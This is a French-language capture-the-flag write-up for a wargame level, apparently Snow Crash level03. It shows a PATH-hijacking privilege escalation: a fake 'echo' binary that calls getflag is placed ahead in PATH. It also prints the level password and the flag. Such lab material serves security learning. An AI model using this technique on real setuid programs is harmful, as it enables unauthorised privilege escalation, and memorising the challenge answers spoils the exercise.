# level 03

### ![#409EFF](https://via.placeholder.com/15/409EFF/000000?text=+) `‎‎‎‎‎‎‎‏‏‎ Password`
```
kooda2puivaav1idi4f57q8iq
```

### ![#E6A23C](https://via.placeholder.com/15/E6A23C/000000?text=+) `‎‎‎‎‎‎‎‏‏‎ ‎‏‏‎Exploit`

```cmd
ls -l
```
On voit que le fichier possède les droit flag et level03

Ltrace montre que l’appelle system est utilisé, et qu’il suggère de l’exploiter
```sh
system("/usr/bin/env echo Exploit me"Exploit me
```

L’idée est de trick le binaire pour qu’il exécute un alias de la fonction echo, qui lancera getflag à la place.

Écrire un petit programme, dans /tmp/ qui utilise la fonction system pour lancer la fonction getflag
```c
int	main() {
	system("/bin/getflag");
	return 0;
}
```
Ensuite, renommer le binaire en echo
```sh
gcc wow.c -o echo
```
Export notre bin, devant tous les autres
```sh
export PATH=/tmp:$PATH
```
Puis relancer level03 (qui va donc utiliser notre alias d’echo et lancer getflag pour nous)


```cmd
su level04
```

### ![#67C23A](https://via.placeholder.com/15/67C23A/000000?text=+) `‎‎‎‎‎‎‎‏‏‎ Flag`
```
qi0maab88jeaj46qoumi7maus
```